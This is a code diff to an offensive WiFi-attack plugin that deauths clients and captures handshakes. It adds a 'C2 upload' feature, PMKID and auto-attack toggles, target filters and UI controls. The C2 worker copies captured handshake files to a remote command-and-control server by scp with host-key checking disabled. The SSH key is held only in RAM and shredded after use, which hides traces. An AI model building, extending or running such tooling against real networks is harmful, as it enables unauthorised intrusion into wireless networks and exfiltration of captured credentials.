@@ -72,7 +72,7 @@ _DEFAULT_UPDATE_URL = (
 
 class WdScanner(plugins.Plugin):
     __author__ = "you@example.com"
-    __version__ = "2.5.0"
+    __version__ = "2.6.0"
     __license__ = "GPL3"
     __description__ = (
         "Use a second radio to scan for SSIDs/clients and selectively deauth "
@@ -162,6 +162,11 @@ class WdScanner(plugins.Plugin):
         self._mac_random_enabled = False
         self._mac_random_oui = None          # "Apple", "Samsung", etc.
 
+        # C2 upload state (ephemeral - no disk persistence).
+        self._c2_host = None                 # "user@host:port"
+        self._c2_upload_running = False
+        self._c2_upload_log = []
+
         # Auto-updater state.
         self._update_url = _DEFAULT_UPDATE_URL
         self._update_check_interval = 24 * 3600   # seconds between checks
@@ -209,6 +214,13 @@ class WdScanner(plugins.Plugin):
 
         # Auto-attack config.
         self._auto_attack = bool(opts.get("auto_attack", False))
+
+        # C2 config (host only, key uploaded per-session).
+        self._c2_host = opts.get("c2_host", "")  # format: "user@host:port"
+
+        # MAC randomization config.
+        self._mac_random_enabled = bool(opts.get("mac_random_enabled", False))
+        self._mac_random_oui = opts.get("mac_random_oui", None)
 
         # Check for PMKID tools.
         self._pmkid_available = (
@@ -2478,6 +2490,154 @@ class WdScanner(plugins.Plugin):
         except subprocess.TimeoutExpired:
             return ""
 
+    # ------------------------------------------------------------- C2 upload
+
+    def _log_c2(self, msg):
+        """Log C2 upload messages."""
+        ts = time.strftime("%H:%M:%S")
+        line = "[%s] %s" % (ts, msg)
+        self._c2_upload_log.append(line)
+        if len(self._c2_upload_log) > 200:
+            self._c2_upload_log = self._c2_upload_log[-200:]
+        logging.info("[wd_scanner.c2] %s", msg)
+
+    def _start_c2_upload(self, ssh_key_pem, target_bssid=None):
+        """Start C2 upload with ephemeral SSH key (never written to disk)."""
+        with self._lock:
+            if self._c2_upload_running:
+                return False, "upload already in progress"
+            if not self._c2_host:
+                return False, "C2 host not configured"
+            if not ssh_key_pem:
+                return False, "SSH key required"
+
+            self._c2_upload_running = True
+            self._c2_upload_log = []
+            self._c2_upload_thread = threading.Thread(
+                target=self._c2_upload_worker,
+                args=(ssh_key_pem, target_bssid),
+                daemon=True,
+            )
+            self._c2_upload_thread.start()
+            return True, "upload started"
+
+    def _c2_upload_worker(self, ssh_key_pem, target_bssid):
+        """Upload data to C2 server via SSH. Key is in-memory only."""
+        try:
+            self._log_c2(">>> C2 UPLOAD STARTED")
+            self._log_c2("target: %s" % self._c2_host)
+
+            if not shutil.which("ssh"):
+                self._log_c2("ERROR: ssh not found on PATH")
+                return
+
+            # Parse C2 host.
+            parts = self._c2_host.split("@")
+            if len(parts) != 2:
+                self._log_c2("ERROR: invalid C2 host format (expected user@host:port)")
+                return
+            user = parts[0]
+            host_port = parts[1].split(":")
+            host = host_port[0]
+            port = host_port[1] if len(host_port) > 1 else "22"
+
+            # Create ephemeral key file in tmpfs (/dev/shm).
+            tmpdir = tempfile.mkdtemp(prefix="wd_c2_", dir="/dev/shm")
+            key_file = os.path.join(tmpdir, "key")
+
+            try:
+                # Write key to tmpfs (RAM-only).
+                with open(key_file, "w") as f:
+                    f.write(ssh_key_pem)
+                os.chmod(key_file, 0o600)
+                self._log_c2("ephemeral key created in tmpfs (RAM only)")
+
+                # Determine what to upload.
+                handshake_dir = self._handshake_dir()
+                files_to_upload = []
+
+                if target_bssid:
+                    # Upload specific target.
+                    bssid_clean = target_bssid.replace(":", "").lower()
+                    for fname in os.listdir(handshake_dir):
+                        if bssid_clean in fname.lower():
+                            files_to_upload.append(os.path.join(handshake_dir, fname))
+                    self._log_c2("uploading %d files for %s" % (len(files_to_upload), target_bssid))
+                else:
+                    # Upload everything.
+                    for fname in os.listdir(handshake_dir):
+                        fpath = os.path.join(handshake_dir, fname)
+                        if os.path.isfile(fpath):
+                            files_to_upload.append(fpath)
+                    self._log_c2("uploading %d files (all data)" % len(files_to_upload))
+
+                if not files_to_upload:
+                    self._log_c2("no files to upload")
+                    return
+
+                # Create remote directory named after hostname.
+                hostname = socket.gethostname()
+                remote_dir = "/tmp/wd_upload_%s_%d" % (hostname, int(time.time()))
+
+                self._log_c2("creating remote directory: %s" % remote_dir)
+                mkdir_cmd = [
+                    "ssh",
+                    "-i", key_file,
+                    "-p", port,
+                    "-o", "StrictHostKeyChecking=no",
+                    "-o", "UserKnownHostsFile=/dev/null",
+                    "-o", "BatchMode=yes",
+                    "%s@%s" % (user, host),
+                    "mkdir -p %s" % remote_dir
+                ]
+
+                result = self._run(mkdir_cmd, check=False, timeout=30)
+                if result and "error" in result.lower():
+                    self._log_c2("WARNING: mkdir: %s" % result[:100])
+
+                # Upload files via scp.
+                for fpath in files_to_upload:
+                    fname = os.path.basename(fpath)
+                    self._log_c2("uploading %s..." % fname)
+
+                    scp_cmd = [
+                        "scp",
+                        "-i", key_file,
+                        "-P", port,
+                        "-o", "StrictHostKeyChecking=no",
+                        "-o", "UserKnownHostsFile=/dev/null",
+                        "-o", "BatchMode=yes",
+                        fpath,
+                        "%s@%s:%s/" % (user, host, remote_dir)
+                    ]
+
+                    result = self._run(scp_cmd, check=False, timeout=120)
+                    if result and "error" in result.lower():
+                        self._log_c2("  FAILED: %s" % result[:100])
+                    else:
+                        self._log_c2("  OK: %s" % fname)
+
+                self._log_c2("upload complete: %s" % remote_dir)
+
+            finally:
+                # Shred key file and remove tmpdir.
+                try:
+                    if os.path.exists(key_file):
+                        # Overwrite with random data before deletion.
+                        with open(key_file, "wb") as f:
+                            f.write(os.urandom(os.path.getsize(key_file)))
+                        os.remove(key_file)
+                    shutil.rmtree(tmpdir)
+                    self._log_c2("ephemeral key destroyed")
+                except Exception as e:
+                    self._log_c2("WARNING: key cleanup failed: %s" % e)
+
+        except Exception as e:
+            self._log_c2("ERROR: %s" % e)
+            logging.exception("[wd_scanner.c2] upload failed")
+        finally:
+            self._c2_upload_running = False
+
     # -------------------------------------------------------------------- HTTP
 
     def on_webhook(self, path, request):
@@ -2645,6 +2805,46 @@ class WdScanner(plugins.Plugin):
             self._handshake_toast_dismissed = time.time()
             return jsonify({"ok": True})
 
+        if req.method == "POST" and norm == "set_note":
+            bssid = (req.form.get("bssid") or "").strip()
+            note = (req.form.get("note") or "").strip()
+            if bssid:
+                self._set_note(bssid, note)
+            return jsonify({"ok": True})
+
+        if req.method == "POST" and norm == "set_filter":
+            self._filter_min_signal = int(req.form.get("min_signal", -100))
+            self._filter_min_clients = int(req.form.get("min_clients", 0))
+            sec_types = req.form.get("security", "")
+            self._filter_security = [s.strip() for s in sec_types.split(",") if s.strip()]
+            self._filter_hide_pwned = bool(req.form.get("hide_pwned", ""))
+            return jsonify({"ok": True})
+
+        if req.method == "POST" and norm == "toggle_pmkid":
+            self._pmkid_attack_mode = not self._pmkid_attack_mode
+            return jsonify({"enabled": self._pmkid_attack_mode})
+
+        if req.method == "POST" and norm == "toggle_auto_attack":
+            self._auto_attack = not self._auto_attack
+            return jsonify({"enabled": self._auto_attack})
+
+        if req.method == "POST" and norm == "export":
+            bssid = (req.form.get("bssid") or "").strip()
+            if not bssid:
+                return jsonify({"ok": False, "error": "BSSID required"})
+            archive = self._export_target_data(bssid)
+            if archive:
+                return jsonify({"ok": True, "file": archive})
+            return jsonify({"ok": False, "error": "no data to export"})
+
+        if req.method == "POST" and norm == "c2_upload":
+            ssh_key = (req.form.get("ssh_key") or "").strip()
+            target_bssid = (req.form.get("bssid") or "").strip() or None
+            if not ssh_key:
+                return jsonify({"ok": False, "error": "SSH key required"})
+            ok, msg = self._start_c2_upload(ssh_key, target_bssid)
+            return jsonify({"ok": ok, "message": msg})
+
         if norm == "status.json":
             return jsonify({
                 "scan_running": self._scan_running,
@@ -2657,10 +2857,23 @@ class WdScanner(plugins.Plugin):
                 "recon_log": self._recon_log[-50:],
                 "plunder_running": self._plunder_running,
                 "plunder_log": self._plunder_log[-50:],
+                "c2_upload_running": self._c2_upload_running,
+                "c2_upload_log": self._c2_upload_log[-50:],
+                "c2_host": self._c2_host,
                 "iface": self._iface_cfg,
                 "mon_iface": self._mon_iface,
                 "available": self._list_wireless_ifaces(),
                 "select_error": self._select_error,
+                "pmkid_available": self._pmkid_available,
+                "pmkid_enabled": self._pmkid_attack_mode,
+                "auto_attack_enabled": self._auto_attack,
+                "mac_random_enabled": self._mac_random_enabled,
+                "filters": {
+                    "min_signal": self._filter_min_signal,
+                    "min_clients": self._filter_min_clients,
+                    "security": self._filter_security,
+                    "hide_pwned": self._filter_hide_pwned,
+                },
                 "version": self.__version__,
                 "update": {
                     "url": self._update_url,
@@ -2861,6 +3074,18 @@ class WdScanner(plugins.Plugin):
                     )
                 )
 
+            # Note row.
+            note = self._get_note(ap["bssid"])
+            note_row = ""
+            if not grouped:
+                note_display = escape(note) if note else "<em style='color:var(--mute)'>tap to add note</em>"
+                note_row = (
+                    "<div class='note-row' data-bssid='{bssid}'>"
+                    "<dt>NOTE</dt>"
+                    "<dd class='note-text'>{note}</dd>"
+                    "</div>".format(bssid=escape(ap["bssid"]), note=note_display)
+                )
+
             hack_button_label = (
                 "<span class='glyph'>&#x2713;</span> RE-CAPTURE"
                 if is_pwned
@@ -2935,6 +3160,7 @@ class WdScanner(plugins.Plugin):
                 "    <div><dt>NODES</dt><dd class='cl {cl_cls}'>{cl}</dd></div>"
                 "    {password_row}"
                 "  </dl>"
+                "  {note_row}"
                 "  <form method='POST' action='/plugins/wd_scanner/deauth' class='hack-form'"
                 "        onsubmit=\"return confirm('{confirm}{ssid_js}\\nDeauth + capture?');\">"
                 "    {csrf}"
@@ -2963,6 +3189,7 @@ class WdScanner(plugins.Plugin):
                 enc=escape(enc_raw),
                 enc_cls=enc_cls,
                 password_row=password_row,
+                note_row=note_row,
                 confirm=confirm_msg,
                 label=hack_button_label,
                 csrf=csrf_input,
@@ -3414,6 +3641,25 @@ body::before {{
 .pw .copy:active {{ transform: translateY(1px); }}
 .pw .copy.ok {{ background: var(--green); color: #002912; }}
 
+/* ---- note row ---- */
+.note-row {{
+  display: flex; flex-direction: column;
+  border-left: 1px dashed #1f2a33;
+  padding: 4px 0 4px 8px; margin-top: 8px;
+  cursor: pointer;
+}}
+.note-row dt {{
+  font-size: 10px; letter-spacing: .25em;
+  color: var(--mute); text-transform: uppercase;
+}}
+.note-row dd {{
+  margin: 2px 0 0; font-size: 12px;
+  color: var(--cyan);
+}}
+.note-row:hover {{
+  background: rgba(0,229,255,.05);
+}}
+
 /* ---- SSID group (multiple BSSIDs) ---- */
 .node-group {{
   border: 1px solid var(--grid);
@@ -3803,6 +4049,99 @@ footer.tag {{
 .terminal-line.error {{ color: var(--red); }}
 .terminal-line.info {{ color: var(--cyan); }}
 
+/* ---- controls panel ---- */
+.controls-panel {{
+  display: flex; gap: 8px; flex-wrap: wrap;
+  padding: 8px 12px; margin: 0 -12px 12px;
+  background: rgba(13,17,21,.6);
+  border-bottom: 1px solid var(--grid);
+}}
+.toggle-btn {{
+  appearance: none; -webkit-appearance: none;
+  background: var(--panel); border: 1px solid var(--grid);
+  color: var(--mute); font: inherit; font-size: 11px;
+  letter-spacing: .15em; text-transform: uppercase;
+  padding: 8px 12px; cursor: pointer;
+  transition: all .12s;
+}}
+.toggle-btn:hover {{ background: var(--grid); }}
+.toggle-btn:active {{ transform: translateY(1px); }}
+.toggle-btn span {{ color: var(--cyan); font-weight: 700; }}
+
+/* ---- modal dialogs ---- */
+.modal-overlay {{
+  display: none;
+  position: fixed; inset: 0; z-index: 300;
+  background: rgba(0,0,0,.9);
+  backdrop-filter: blur(6px);
+  align-items: center; justify-content: center;
+  padding: 16px;
+}}
+.modal-overlay.visible {{ display: flex; }}
+.modal-box {{
+  width: 100%; max-width: 600px; max-height: 90vh;
+  background: linear-gradient(180deg, #0e141a, #0a0e12);
+  border: 2px solid var(--orange);
+  clip-path: polygon(12px 0, 100% 0, 100% calc(100% - 12px), calc(100% - 12px) 100%, 0 100%, 0 12px);
+  display: flex; flex-direction: column;
+  box-shadow: 0 0 40px rgba(255,122,0,.3);
+}}
+.modal-header {{
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 12px 16px;
+  border-bottom: 1px solid var(--orange);
+  background: rgba(255,122,0,.05);
+}}
+.modal-title {{
+  color: var(--orange); font-weight: 700; font-size: 13px;
+  letter-spacing: .2em; text-transform: uppercase;
+}}
+.modal-close {{
+  appearance: none; -webkit-appearance: none;
+  background: transparent; border: 1px solid var(--orange);
+  color: var(--orange);
+  font: inherit; font-size: 11px; font-weight: 700;
+  letter-spacing: .15em; padding: 6px 12px; cursor: pointer;
+  clip-path: polygon(4px 0, 100% 0, 100% calc(100% - 4px), calc(100% - 4px) 100%, 0 100%, 0 4px);
+  transition: background .12s;
+}}
+.modal-close:hover {{ background: rgba(255,122,0,.15); }}
+.modal-close:active {{ background: rgba(255,122,0,.25); }}
+.modal-body {{
+  padding: 16px;
+  overflow-y: auto;
+}}
+.modal-body label {{
+  display: block; margin-bottom: 12px;
+  color: var(--fg); font-size: 12px;
+  letter-spacing: .1em; text-transform: uppercase;
+}}
+.modal-body input[type=text],
+.modal-body input[type=number],
+.modal-body textarea {{
+  width: 100%; margin-top: 4px;
+  background: #05080a; border: 1px solid var(--grid);
+  color: var(--cyan); padding: 8px;
+  font: inherit; font-size: 13px;
+}}
+.modal-body textarea {{
+  font-family: ui-monospace, monospace;
+  resize: vertical;
+}}
+.modal-body input:focus,
+.modal-body textarea:focus {{
+  outline: none; border-color: var(--orange);
+  box-shadow: 0 0 0 2px rgba(255,122,0,.2);
+}}
+.modal-body .btn {{
+  width: 100%; margin-top: 16px;
+}}
+.modal-hint {{
+  background: rgba(255,122,0,.1); border-left: 3px solid var(--orange);
+  padding: 8px 12px; margin-bottom: 16px;
+  font-size: 12px; color: var(--fg);
+}}
+
 /* ---- larger phones / small tablets ---- */
 @media (min-width: 560px) {{
   body {{ font-size: 15px; }}
@@ -3911,6 +4250,13 @@ option[data-role='shared'] {{ color: var(--warn) !important; }}
     </form>
   </div>
 
+  <div class='controls-panel'>
+    <button class='toggle-btn' id='toggle-pmkid' {pmkid_disabled}>PMKID: <span id='pmkid-state'>{pmkid_state}</span></button>
+    <button class='toggle-btn' id='toggle-auto-attack'>AUTO: <span id='auto-attack-state'>{auto_attack_state}</span></button>
+    <button class='toggle-btn' id='show-filters'>FILTERS</button>
+    <button class='toggle-btn' id='show-c2'>C2 UPLOAD</button>
+  </div>
+
   <div id='wd-shotgun'>{shotgun_panel}</div>
 
   <div class='section-h collapsible' id='wd-grid-toggle'>
@@ -3945,8 +4291,71 @@ option[data-role='shared'] {{ color: var(--warn) !important; }}
   </div>
 </div>
 
+<div class='modal-overlay' id='filter-modal'>
+  <div class='modal-box'>
+    <div class='modal-header'>
+      <div class='modal-title'>TARGET FILTERS</div>
+      <button class='modal-close' data-modal='filter-modal'>CLOSE</button>
+    </div>
+    <div class='modal-body'>
+      <label>Min Signal (dBm): <input type='number' id='filter-signal' value='-100' min='-100' max='0'></label>
+      <label>Min Clients: <input type='number' id='filter-clients' value='0' min='0' max='100'></label>
+      <label>Security Type: <input type='text' id='filter-security' placeholder='WPA2,WPA3 (empty = all)'></label>
+      <label><input type='checkbox' id='filter-hide-pwned'> Hide Pwned Networks</label>
+      <button class='btn' id='apply-filters'>APPLY FILTERS</button>
+    </div>
+  </div>
+</div>
+
+<div class='modal-overlay' id='c2-modal'>
+  <div class='modal-box'>
+    <div class='modal-header'>
+      <div class='modal-title'>C2 UPLOAD</div>
+      <button class='modal-close' data-modal='c2-modal'>CLOSE</button>
+    </div>
+    <div class='modal-body'>
+      <p class='modal-hint'>Upload data to C2 server. SSH key is NOT saved to disk.</p>
+      <label>C2 Host: <input type='text' id='c2-host' value='{c2_host}' placeholder='user@host:port' disabled></label>
+      <label>SSH Private Key (PEM):<textarea id='c2-key' rows='8' placeholder='-----BEGIN RSA PRIVATE KEY-----&#10;...'></textarea></label>
+      <label>Target BSSID (optional): <input type='text' id='c2-bssid' placeholder='empty = upload all'></label>
+      <button class='btn' id='start-c2-upload'>START UPLOAD</button>
+    </div>
+  </div>
+</div>
+
 <script>
 (function () {{
+  // ---- Note editing ----
+  document.addEventListener('click', function (ev) {{
+    var noteRow = ev.target.closest && ev.target.closest('.note-row');
+    if (!noteRow) return;
+    var bssid = noteRow.getAttribute('data-bssid');
+    var currentNote = noteRow.querySelector('.note-text').textContent;
+    if (currentNote === 'tap to add note') currentNote = '';
+    var newNote = prompt('Note for ' + bssid + ':', currentNote);
+    if (newNote !== null) {{
+      fetch('/plugins/wd_scanner/set_note', {{
+        method: 'POST',
+        credentials: 'same-origin',
+        headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
+        body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '') +
+              '&bssid=' + encodeURIComponent(bssid) +
+              '&note=' + encodeURIComponent(newNote)
+      }})
+        .then(function () {{
+          noteRow.querySelector('.note-text').textContent = newNote || 'tap to add note';
+          if (newNote) {{
+            noteRow.querySelector('.note-text').style.fontStyle = 'normal';
+            noteRow.querySelector('.note-text').style.color = 'var(--cyan)';
+          }} else {{
+            noteRow.querySelector('.note-text').style.fontStyle = 'italic';
+            noteRow.querySelector('.note-text').style.color = 'var(--mute)';
+          }}
+        }})
+        .catch(function () {{}});
+    }}
+  }});
+
   // ---- Copy-to-clipboard handler ----
   document.addEventListener('click', function (ev) {{
     var t = ev.target;
@@ -4197,6 +4606,167 @@ option[data-role='shared'] {{ color: var(--warn) !important; }}
   }}
 
   setInterval(checkForOperations, 1000);
+
+  // ---- Modal dialogs ----
+  var filterModal = document.getElementById('filter-modal');
+  var c2Modal = document.getElementById('c2-modal');
+
+  document.querySelectorAll('.modal-close').forEach(function (btn) {{
+    btn.addEventListener('click', function () {{
+      var modal = document.getElementById(btn.getAttribute('data-modal'));
+      if (modal) modal.classList.remove('visible');
+    }});
+  }});
+
+  document.getElementById('show-filters').addEventListener('click', function () {{
+    filterModal.classList.add('visible');
+  }});
+
+  document.getElementById('show-c2').addEventListener('click', function () {{
+    c2Modal.classList.add('visible');
+  }});
+
+  // ---- Toggle buttons ----
+  document.getElementById('toggle-pmkid').addEventListener('click', function () {{
+    fetch('/plugins/wd_scanner/toggle_pmkid', {{
+      method: 'POST',
+      credentials: 'same-origin',
+      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
+      body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '')
+    }})
+      .then(function (r) {{ return r.ok ? r.json() : null; }})
+      .then(function (data) {{
+        if (data) {{
+          document.getElementById('pmkid-state').textContent = data.enabled ? 'ON' : 'OFF';
+        }}
+      }})
+      .catch(function () {{}});
+  }});
+
+  document.getElementById('toggle-auto-attack').addEventListener('click', function () {{
+    fetch('/plugins/wd_scanner/toggle_auto_attack', {{
+      method: 'POST',
+      credentials: 'same-origin',
+      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
+      body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '')
+    }})
+      .then(function (r) {{ return r.ok ? r.json() : null; }})
+      .then(function (data) {{
+        if (data) {{
+          document.getElementById('auto-attack-state').textContent = data.enabled ? 'ON' : 'OFF';
+        }}
+      }})
+      .catch(function () {{}});
+  }});
+
+  // ---- Filter controls ----
+  document.getElementById('apply-filters').addEventListener('click', function () {{
+    var signal = document.getElementById('filter-signal').value;
+    var clients = document.getElementById('filter-clients').value;
+    var security = document.getElementById('filter-security').value;
+    var hidePwned = document.getElementById('filter-hide-pwned').checked;
+
+    fetch('/plugins/wd_scanner/set_filter', {{
+      method: 'POST',
+      credentials: 'same-origin',
+      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
+      body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '') +
+            '&min_signal=' + encodeURIComponent(signal) +
+            '&min_clients=' + encodeURIComponent(clients) +
+            '&security=' + encodeURIComponent(security) +
+            '&hide_pwned=' + (hidePwned ? '1' : '')
+    }})
+      .then(function () {{
+        filterModal.classList.remove('visible');
+        alert('Filters applied');
+      }})
+      .catch(function () {{}});
+  }});
+
+  // ---- C2 upload ----
+  document.getElementById('start-c2-upload').addEventListener('click', function () {{
+    var key = document.getElementById('c2-key').value.trim();
+    var bssid = document.getElementById('c2-bssid').value.trim();
+
+    if (!key) {{
+      alert('SSH key required');
+      return;
+    }}
+
+    if (!confirm('Upload data to C2? Key will NOT be saved to disk.')) {{
+      return;
+    }}
+
+    fetch('/plugins/wd_scanner/c2_upload', {{
+      method: 'POST',
+      credentials: 'same-origin',
+      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
+      body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '') +
+            '&ssh_key=' + encodeURIComponent(key) +
+            '&bssid=' + encodeURIComponent(bssid)
+    }})
+      .then(function (r) {{ return r.ok ? r.json() : null; }})
+      .then(function (data) {{
+        if (data && data.ok) {{
+          // Clear key immediately.
+          document.getElementById('c2-key').value = '';
+          c2Modal.classList.remove('visible');
+          // Show terminal for C2 upload.
+          showTerminal('c2');
+        }} else {{
+          alert('Upload failed: ' + (data ? data.error : 'unknown error'));
+        }}
+      }})
+      .catch(function () {{
+        alert('Upload request failed');
+      }});
+  }});
+
+  // Auto-show terminal for C2 uploads.
+  var lastC2Running = false;
+  setInterval(function () {{
+    fetch('/plugins/wd_scanner/status.json', {{ credentials: 'same-origin' }})
+      .then(function (r) {{ return r.ok ? r.json() : null; }})
+      .then(function (data) {{
+        if (!data) return;
+        if (data.c2_upload_running && !lastC2Running && !terminalOverlay.classList.contains('visible')) {{
+          terminalMode = 'c2';
+          terminalLogOffset = 0;
+          terminalOutput.innerHTML = '';
+          terminalTitle.textContent = 'C2 UPLOAD IN PROGRESS';
+          terminalOverlay.classList.add('visible');
+          if (terminalPollInterval) clearInterval(terminalPollInterval);
+          terminalPollInterval = setInterval(function () {{
+            fetch('/plugins/wd_scanner/status.json', {{ credentials: 'same-origin' }})
+              .then(function (r) {{ return r.ok ? r.json() : null; }})
+              .then(function (d) {{
+                if (!d) return;
+                var logs = d.c2_upload_log || [];
+                if (logs.length > terminalLogOffset) {{
+                  var newLines = logs.slice(terminalLogOffset);
+                  for (var i = 0; i < newLines.length; i++) {{
+                    var line = document.createElement('div');
+                    line.className = 'terminal-line';
+                    var text = newLines[i];
+                    if (text.match(/ERROR|FAILED/i)) line.classList.add('error');
+                    else if (text.match(/WARNING/i)) line.classList.add('warn');
+                    else if (text.match(/OK|complete/i)) line.classList.add('info');
+                    line.textContent = text;
+                    terminalOutput.appendChild(line);
+                  }}
+                  terminalLogOffset = logs.length;
+                  terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                }}
+                if (!d.c2_upload_running && terminalLogOffset > 0 && terminalPollInterval) {{
+                  clearInterval(terminalPollInterval);
+                  terminalPollInterval = null;
+                }}
+              }});
+          }}, 1000);
+        }}
+        lastC2Running = data.c2_upload_running;
+      }});
+  }}, 1000);
 }})();
 </script>
 </body></html>
@@ -4230,6 +4800,10 @@ option[data-role='shared'] {{ color: var(--warn) !important; }}
             pwned_count=len(self._compact_pwned_list(cracked)),
             recon_count=len(self._list_recon_reports()),
             plunder_count=len(self._list_plunder_jobs()),
+            pmkid_disabled="" if self._pmkid_available else "disabled",
+            pmkid_state="ON" if self._pmkid_attack_mode else "OFF",
+            auto_attack_state="ON" if self._auto_attack else "OFF",
+            c2_host=escape(self._c2_host or "not configured"),
         )
         return body
 
